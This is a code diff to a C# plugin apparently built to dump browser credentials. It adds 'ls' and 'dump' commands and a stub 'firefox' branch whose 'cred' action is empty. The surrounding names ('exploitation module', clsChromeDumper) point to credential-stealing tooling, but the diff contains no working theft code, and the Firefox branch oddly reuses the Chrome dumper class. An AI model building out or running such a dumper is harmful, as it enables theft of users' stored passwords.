@@ -44,6 +44,9 @@ namespace Plugin48Dumper
             _table.Columns.Add("Command");
             _table.Columns.Add("Description");
 
+            _table.Rows.Add("ls", "Print available modules.");
+            _table.Rows.Add("dump", "Dump target.");
+
             //Load exploitation module
             foreach (var module in m_lsModule)
             {
@@ -177,6 +180,18 @@ namespace Plugin48Dumper
                     else
                     {
                         clsTools.fnLogError("Invalid action: " + szAction);
+                    }
+                }
+                else if (szTarget == "firefox")
+                {
+                    var module = (clsChromeDumper)m_dicModule[szTarget];
+                    string szAction = lsKey[2];
+
+                    clsTools.fnLogInfo("Action => " + szAction);
+
+                    if (szAction == "cred")
+                    {
+
                     }
                 }
                 else if (szTarget == "xterm")
